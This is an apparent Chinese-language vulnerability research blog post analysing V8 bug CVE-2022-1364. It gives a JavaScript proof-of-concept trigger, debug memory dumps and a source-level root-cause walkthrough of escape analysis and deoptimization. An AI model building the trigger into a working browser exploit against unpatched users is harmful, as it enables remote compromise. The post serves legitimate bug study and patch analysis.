<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Chrome漏洞分析与利用(十二)——issue 1315901(CVE-2022-1364)</title>
  <link rel="stylesheet" href="https://stackedit.io/style.css" />
</head>

<body class="stackedit">
  <a href="../index.html" style="position: fixed; top: 0; left: 2pt; text-align: center;text-decoration-line: none;color: black;font-size: 15px;">
    <img src="../img/home.png" width="15" height="15" alt="home">
    <span>HOME PAGE</span>
  </a>
  <div class="stackedit__html"><h1><a id="POC_0"></a>POC</h1>
<p><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1315901">issue-1315901</a></p>
<pre><code class="prism language-js"><span class="token keyword">function</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token parameter">bug</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">function</span> <span class="token constant">C</span><span class="token punctuation">(</span><span class="token parameter">z</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      Error<span class="token punctuation">.</span><span class="token function-variable function">prepareStackTrace</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">t<span class="token punctuation">,</span> <span class="token constant">B</span></span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token constant">B</span><span class="token punctuation">[</span>z<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">getThis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span><span class="token punctuation">;</span>
      <span class="token comment">// Error()是为了创建Error对象，Error对象创建会</span>
      <span class="token comment">// 调用Summarize函数重复创建对象，stack是为了执行</span>
      <span class="token comment">// prepareStackTrace回调函数</span>
      <span class="token keyword">let</span> p <span class="token operator">=</span> <span class="token function">Error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>stack<span class="token punctuation">;</span>
      <span class="token keyword">return</span> p<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">function</span> <span class="token constant">J</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
    <span class="token keyword">var</span> optim <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function">opt</span> <span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        b<span class="token punctuation">.</span><span class="token function">d</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token keyword">var</span> e <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
    <span class="token comment">// 传入arguments对象是为了将arguments对象作为eval函数的this对象</span>
    <span class="token class-name">J</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">d</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token string">"use strict"</span><span class="token punctuation">;</span>
        b<span class="token punctuation">.</span><span class="token function">a</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>arguments<span class="token punctuation">,</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> arguments<span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span>

    <span class="token class-name">J</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">a</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">a</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        a<span class="token punctuation">.</span><span class="token function">b</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token comment">// if(s)是为了防止解优化(分支中代码行数过少也会被解优化)，</span>
    <span class="token comment">// 解优化只会调用一次TranslatedValue::GetValue函数</span>
    <span class="token comment">// 来具体化对象，而不执行解优化步骤时每次创建Error对象</span>
    <span class="token comment">// 都会调用一次TranslatedValue::GetValue函数也就是</span>
    <span class="token comment">// 说每创建一次Error对象，都会创建一个新的对象</span>
    <span class="token class-name">J</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">b</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">b</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        b<span class="token punctuation">.</span><span class="token function">c</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">let</span> s <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">{</span>
            k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>
            k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>
            k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>
            k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>
            k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>
            k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>
            k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>
            k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>
            k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>
            k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>
            k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>
            k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>
            k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>
            k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>
            k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>
            k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>
            k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>
            k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>
            k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>
            k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>
            k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>
            k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>k <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token class-name">J</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">c</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>optim<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// 创建两次Error对象</span>
        <span class="token keyword">var</span> z <span class="token operator">=</span> <span class="token constant">C</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">var</span> p <span class="token operator">=</span> <span class="token constant">C</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        e <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token constant">M</span><span class="token operator">:</span> z<span class="token punctuation">,</span> <span class="token constant">C</span><span class="token operator">:</span> p<span class="token punctuation">}</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">J</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// jit optim</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>bug<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> <span class="token constant">V</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token number">1E4</span> <span class="token operator">&gt;</span> <span class="token constant">V</span><span class="token punctuation">;</span> <span class="token constant">V</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">opt</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    optim <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token function">opt</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> e<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  
  e1 <span class="token operator">=</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token comment">// prints true.</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>e1<span class="token punctuation">.</span><span class="token constant">M</span> <span class="token operator">===</span> e1<span class="token punctuation">.</span><span class="token constant">C</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  e2 <span class="token operator">=</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token comment">// should be true as above but prints false.</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>e2<span class="token punctuation">.</span><span class="token constant">M</span> <span class="token operator">===</span> e2<span class="token punctuation">.</span><span class="token constant">C</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  
</code></pre>
<h1><a id="_91"></a>漏洞分析</h1>
<p>运行POC会发现两个console.log会输出两个不一样的结果：</p>
<pre><code>true
false
</code></pre>
<p>通过DebugPrint输出e1.M与e1.C会发现其element与对象都指向同一块内存区域</p>
<pre><code>DebugPrint: 0000020B000CBC11: [JS_ARGUMENTS_OBJECT_TYPE]
 - map: 0x020b002848a9 &lt;Map(PACKED_ELEMENTS)&gt; [FastProperties]
 - prototype: 0x020b00244041 &lt;Object map = 0000020B002821E9&gt;
 - elements: 0x020b000cbbfd &lt;FixedArray[3]&gt; [PACKED_ELEMENTS]
 - properties: 0x020b00002261 &lt;FixedArray[0]&gt;
 - All own properties (excluding elements): {
    0000020B00004D89: [String] in ReadOnlySpace: #length: 3 (data field 0), location: in-object
    0000020B00004361: [String] in ReadOnlySpace: #callee: 0x020b0024f2fd &lt;AccessorPair&gt; (const accessor descriptor), location: descriptor
    0x020b00005c0d &lt;Symbol: Symbol.iterator&gt;: 0x020b001c422d &lt;AccessorInfo&gt; (const accessor descriptor), location: descriptor
 }
 - elements: 0x020b000cbbfd &lt;FixedArray[3]&gt; {
           0: 0
           1: 0x020b000cbbc9 &lt;J map = 0000020B00287991&gt;
           2: 1
 }
 ......
DebugPrint: 0000020B000CBC11: [JS_ARGUMENTS_OBJECT_TYPE]
 - map: 0x020b002848a9 &lt;Map(PACKED_ELEMENTS)&gt; [FastProperties]
 - prototype: 0x020b00244041 &lt;Object map = 0000020B002821E9&gt;
 - elements: 0x020b000cbbfd &lt;FixedArray[3]&gt; [PACKED_ELEMENTS]
 - properties: 0x020b00002261 &lt;FixedArray[0]&gt;
 - All own properties (excluding elements): {
    0000020B00004D89: [String] in ReadOnlySpace: #length: 3 (data field 0), location: in-object
    0000020B00004361: [String] in ReadOnlySpace: #callee: 0x020b0024f2fd &lt;AccessorPair&gt; (const accessor descriptor), location: descriptor
    0x020b00005c0d &lt;Symbol: Symbol.iterator&gt;: 0x020b001c422d &lt;AccessorInfo&gt; (const accessor descriptor), location: descriptor
 }
 - elements: 0x020b000cbbfd &lt;FixedArray[3]&gt; {
           0: 0
           1: 0x020b000cbbc9 &lt;J map = 0000020B00287991&gt;
           2: 1
 }
 .......
</code></pre>
<p>但是当输出e2.M与e2.C时，只有element指向同一块内存区域，对象则位于不同的内存区域：</p>
<pre><code>DebugPrint: 0000001C0025765D: [JS_ARGUMENTS_OBJECT_TYPE] in OldSpace
 - map: 0x001c002848a9 &lt;Map(PACKED_ELEMENTS)&gt; [FastProperties]
 - prototype: 0x001c00244041 &lt;Object map = 0000001C002821E9&gt;
 - elements: 0x001c000d9ec5 &lt;FixedArray[3]&gt; [PACKED_ELEMENTS]
 - properties: 0x001c00002261 &lt;FixedArray[0]&gt;
 - All own properties (excluding elements): {
    0000001C00004D89: [String] in ReadOnlySpace: #length: 3 (data field 0), location: in-object
    0000001C00004361: [String] in ReadOnlySpace: #callee: 0x001c0024f2fd &lt;AccessorPair&gt; (const accessor descriptor), location: descriptor
    0x001c00005c0d &lt;Symbol: Symbol.iterator&gt;: 0x001c001c422d &lt;AccessorInfo&gt; (const accessor descriptor), location: descriptor
 }
 - elements: 0x001c000d9ec5 &lt;FixedArray[3]&gt; {
           0: 0
           1: 0x001c000cccb1 &lt;J map = 0000001C00287AA9&gt;
           2: 1
 }
......
DebugPrint: 0000001C0025768D: [JS_ARGUMENTS_OBJECT_TYPE] in OldSpace
 - map: 0x001c002848a9 &lt;Map(PACKED_ELEMENTS)&gt; [FastProperties]
 - prototype: 0x001c00244041 &lt;Object map = 0000001C002821E9&gt;
 - elements: 0x001c000d9ec5 &lt;FixedArray[3]&gt; [PACKED_ELEMENTS]
 - properties: 0x001c00002261 &lt;FixedArray[0]&gt;
 - All own properties (excluding elements): {
    0000001C00004D89: [String] in ReadOnlySpace: #length: 3 (data field 0), location: in-object
    0000001C00004361: [String] in ReadOnlySpace: #callee: 0x001c0024f2fd &lt;AccessorPair&gt; (const accessor descriptor), location: descriptor
    0x001c00005c0d &lt;Symbol: Symbol.iterator&gt;: 0x001c001c422d &lt;AccessorInfo&gt; (const accessor descriptor), location: descriptor
 }
 - elements: 0x001c000d9ec5 &lt;FixedArray[3]&gt; {
           0: 0
           1: 0x001c000cccb1 &lt;J map = 0000001C00287AA9&gt;
           2: 1
 }
......
</code></pre>
<p>通过查看POC代码会发现e1，e2中的C，M对象都是是通过C函数获取到的，C函数中通过<code>let p = Error.stack</code>获取到在Error.prepareStackTrace回调中返回的B[3]，通过打印可知M，C均为Arguments对象<br>
<img src="https://img-blog.csdnimg.cn/b217708e6ff04d2ab1121f7eae6ce577.png" alt="在这里插入图片描述"><br>
当代码执行到<code>let p = Error.stack</code>时会触发<code>MaybeHandle&lt;Object&gt; ErrorUtils::FormatStackTrace</code>函数调用，在执行该函数时会跳过if分支进入else分支执行<br>
<img src="https://img-blog.csdnimg.cn/cedc300dea7c44c7b018b86f8467e529.png" alt="在这里插入图片描述"><br>
之后会先获取全局error函数对象global_error，然后从中获取到prepare_stack_trace回调函数对象<br>
<img src="https://img-blog.csdnimg.cn/782a45bb10f74e7fa5b635ce44e24abf.png" alt="在这里插入图片描述"><br>
随后判断prepare_stack_trace是否是函数对象，之后获取scope函数参数等并将其作为参数去调用Execution::Call函数。<br>
<img src="https://img-blog.csdnimg.cn/49e090cd7eca4501b0e1d077cb3a2c89.png" alt="在这里插入图片描述"><br>
之后先通过调用SetUpForCal函数来初始化InvokeParams对象，然后将InvokeParams对象传入Invoke函数来执行回调函数。<br>
<img src="https://img-blog.csdnimg.cn/a81db104ceb84774b1e69c5dd9f7cfc2.png" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/ace2096dd200437287b7b19c99241440.png" alt="在这里插入图片描述"><br>
Invoke函数会先判断param.target是否为函数对象，通过SetUpForCal函数可知param.target指向callable所以此判断条件成立<br>
<img src="https://img-blog.csdnimg.cn/2abcb6625a8e461fbdc737d2a85b99df.png" alt="在这里插入图片描述"><br>
之后判断是否是api回调，如果是就直接去调用，此处并非API回调于是会跳过此分支<br>
<img src="https://img-blog.csdnimg.cn/ce73845f9b144e1cba82d708bf8d05c6.png" alt="在这里插入图片描述"><br>
然后再判断是否需要ScriptContext，如果需要就为回调函数对象设置Context，在此处也不需要上下文会直接跳过此分支。<br>
<img src="https://img-blog.csdnimg.cn/ba41fa5a800844e488c04e1f43f8d039.png" alt="在这里插入图片描述"><br>
之后还会步过一些if分支，最终执行到以下代码处初始化上下文等内容<br>
<img src="https://img-blog.csdnimg.cn/ccc1cac000a1402581f64eef7822e7fe.png" alt="在这里插入图片描述"><br>
然后判断params.execution_target是否为Execution::Target::kCallable，此处满足此条件进入此分支，先通过GeneratedCode来获取回调函数的汇编代码stub_entry<br>
<img src="https://img-blog.csdnimg.cn/d3b4bcaeb4764c9cb3fe7e765997d0fa.png" alt="在这里插入图片描述"><br>
之后通过stub_entry.Call调用回调函数。<br>
<img src="https://img-blog.csdnimg.cn/2a5d078593cc4a53a85330ac219747df.png" alt="在这里插入图片描述"><br>
在回调函数产生的JIT代码中会去调用getThis函数，此函数为builtin函数，此函数会通过frame对象中保存的信息获取到相应函数的receiver对象<br>
<img src="https://img-blog.csdnimg.cn/a35b325502c84e268c8bfe935cf06460.png" alt="在这里插入图片描述"><br>
本以为指向同一块element的ArgumentsObject对象是在getThis中生成的，但在getThis函数的执行逻辑中并未找到，再结合patch与类似的漏洞cve 2021-21195的漏洞分析，最后发现实际是在OptimizedFrame::Summarize函数中生成的，该函数在创建JSError对象过程中被调用会打包产生错误的函数及其相关对象数据。<br>
<img src="https://img-blog.csdnimg.cn/1b8080ca452a4a90b800fa3f2c5c46be.png" alt="在这里插入图片描述"><br>
Summarize函数会先获取code对象，然后根据code对象判断其kind是否为BUILTIN，如果是的话就委托给JS Frame处理，然后再获取解优化数据。<br>
<img src="https://img-blog.csdnimg.cn/552ebab608604615a0ab9d8f9014228d.png" alt="在这里插入图片描述"><br>
之后创建translated对象进行翻译并根据该对象中的frame进行迭代处理，frame的kind是否等于kUnoptimizedFunction、kJavaScriptBuiltinContinuation或者kJavaScriptBuiltinContinuationWithCatch<br>
<img src="https://img-blog.csdnimg.cn/c8006a9d0c24420ca160a440a4472bfe.png" alt="在这里插入图片描述"><br>
如果满足条件就会继续后续的步骤，通过前面的注释也可以看出在后续的步骤中会导致对象被多次创建<br>
<img src="https://img-blog.csdnimg.cn/dde3af102e4d44f7a91537a597511f82.png" alt="在这里插入图片描述"><br>
当在获取receiver时会去调用TranslatedValue::GetValue函数，该函数会根据kind来判断是获取还是重新构造对象<br>
<img src="https://img-blog.csdnimg.cn/1ec3450ffca943df805a650bf2c2308c.png" alt="在这里插入图片描述"><br>
其中最后一个if分支是要重新构造对象的情况<br>
<img src="https://img-blog.csdnimg.cn/579dbef0688f4e5e9bf12d487073151c.png" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/f8cbb79f33bd4d7c9d6cf559fda80863.png" alt="在这里插入图片描述"><br>
通过阅读相关文档以及chromium源码可知v8在逃逸分析后会将allocate节点删除，逃逸分析这一阶段根据我个人的理解其作用大致就是保留图(Node Graph)中逃逸对象的节点删除未逃逸对象的节点，同时在google对于此漏的报告里也有提到：<a href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2022/CVE-2022-1364.html">CVE-2022-1364: Inconsistent Object Materialization in V8</a>，具体代码位于 EscapeAnalysisReducer::Reduce函数内，该函数负责将逃逸分析阶段的优化结果具体实施到图中，大致处理过程就是放松未逃逸的allocate分配节点，使其在图中不可达：<br>
<img src="https://img-blog.csdnimg.cn/97d77dd4fe2f43018590a38a76e161a6.png" alt="在这里插入图片描述"><br>
通过与turbolizer图的比较可知argument对象生成会触发allocate节点<br>
<img src="https://img-blog.csdnimg.cn/54170c9aeec0463aaba104fde45f823d.png" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/95288c9819f8442e9ae10d4cf3c876a6.png" alt="在这里插入图片描述"><br>
而在经过逃逸分析阶段后会因为前面图中代码的执行导致此allocate节点将不可达变为死节点，死结点最后会在死代码分析阶段被删除。<br>
<img src="https://img-blog.csdnimg.cn/877666b786ab4d9bba41be3b037e0089.png" alt="在这里插入图片描述"><br>
而在执行EscapeAnalysisReducer::Reduce函数执行缩减之前会先执行EscapeAnalysis::Reduce函数，而该函数会去调用ReduceNode函数，ReduceNode函数函数会针对不同的节点进入不同的分支进行处理：<br>
<img src="https://img-blog.csdnimg.cn/e9089bf3bac54d22abf7d962de0319dc.png" alt="在这里插入图片描述"><br>
对于所有对象创建，会先进入allocate节点处理分支根据传入的所需内存大小为对象分配一个VirtualObject对象，该对象用于跟踪对象的存储与加载，argument对象也不例外，不过此处并不会具体的为分配的虚拟对象设置节点，而是先用dead节点为分配的临时内存进行初始化在后期具体的相应节点处理分支中会获取虚拟对象并为其设置具体的节点。<br>
<img src="https://img-blog.csdnimg.cn/883f2fe05fca4a5d8917af1624a6d7b4.png" alt="在这里插入图片描述"><br>
而结合patch可知存在漏洞的版本中对framestate节点没有任何处理，而在修补过后的framestate节点分支中会先将FrameStateType与Summarize函数中的frame-&gt;kind_进行同步，随后获取FrameState的输入节点StateValue节点，并使用StateValue节点初始化一个迭代器，此迭代器用于获取StateValue节点的输入节点，随后用迭代器获取相应function对象及其receiver，通过输出POC代码中Error.prepareStackTrace回调函数中的B数组内容可知其中receiver对应的就是arguments对象，而function就是argument.eval函数。<br>
<img src="https://img-blog.csdnimg.cn/00ca9ba5982c45e39fd08a2b7d101358.png" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/67d03d1eb52344f6885e70723c073b11.png" alt="在这里插入图片描述"><br>
而将receiver与function对象设为逃逸是为了防止在后期的EscapeAnalysisReducer::Reduce函数中放松其allocate节点，allocate节点不被放松其分配也不会被删除，如果分配不被删除，在Summarize函数中就不会去创建对象而是直接去获取自然也就不会触发漏洞。<br>
<img src="https://img-blog.csdnimg.cn/036e7caefc1e445eb07881d016523751.png" alt="在这里插入图片描述"><br>
通过google的报告可知由于节点对象未被标记为逃逸而在最后被删除分配但是由于在后期解优化时还需要将其实例化所以会将其相关信息保存下来。由于POC中<code>return arguments[a]</code>触发的LoadElement节点操作使Element也被保存了下来而ArgumentObject因为未逃逸最后被优化删除，最终导致在TranslatedValue::GetValue函数每次运行都会创建一个同样element的ArgumentObject。<br>
<img src="https://img-blog.csdnimg.cn/4c77909ad7c4401e81ff8430459cb792.png" alt="在这里插入图片描述"></p>
